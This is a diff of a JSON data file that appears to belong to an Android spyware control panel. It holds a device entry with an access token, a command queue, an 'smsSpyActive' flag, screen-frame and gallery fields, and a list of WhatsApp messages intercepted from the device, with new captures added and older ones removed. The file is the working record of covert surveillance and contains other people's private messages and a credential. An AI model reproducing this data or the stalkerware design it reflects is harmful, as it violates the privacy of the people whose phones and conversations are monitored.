@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777178688252,
+    "lastSeen": 1777178697307,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (6 pesan): ~ P1",
+        "content": "💟 Stiker",
+        "time": "26/04 12:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178697790
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (5 pesan): ~ orva",
+        "content": "!SBrat kemana Rani ini pergi😔",
+        "time": "26/04 12:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178690284
+      },
       {
         "appName": "WhatsApp",
         "sender": "Pegasus-X Room",
@@ -4003,22 +4019,6 @@
         "time": "26/04 11:25",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173252991
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOK AXEL 17 STR #1 (49 pesan): ~ Fluxo Cruel",
-        "content": "📷 KALIAN MAU FF KIPAS SEMUA BUNDLE ADA?\n\nMASUK AJA NANTI GW BAGI BAGI TUTOR AMA LINK BUAT DOWNLOAD NYA KALO UDH 100 MEM \n\nhttps://whatsapp.com/channel/0029Val8xlCKWEKnZGHPmM24 \n\nMASUK☝🏻",
-        "time": "26/04 11:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173252876
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (39 pesan): ~ Jz12",
-        "content": "📷 YAKIN GAMAU BELI UNCHECK RAMA STORE?MUMPUNG GACOR JAMIN DPT INI YANG MAU BELI AJA😋😋",
-        "time": "26/04 11:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173252700
       }
     ],
     "galleryPhotos": [],
